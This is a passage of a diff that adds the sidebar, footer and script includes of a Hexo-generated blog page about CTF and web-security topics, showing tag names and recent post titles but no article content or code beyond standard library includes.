rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/10/01/real%20world%20ctf%202020/">real world ctf 2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/roarctf2019/">roarctf2019</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/sctf2020/">sctf2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/tctf2020/">tctf2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/tp5rce%E5%A4%8D%E7%8E%B0/">tp5rce复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
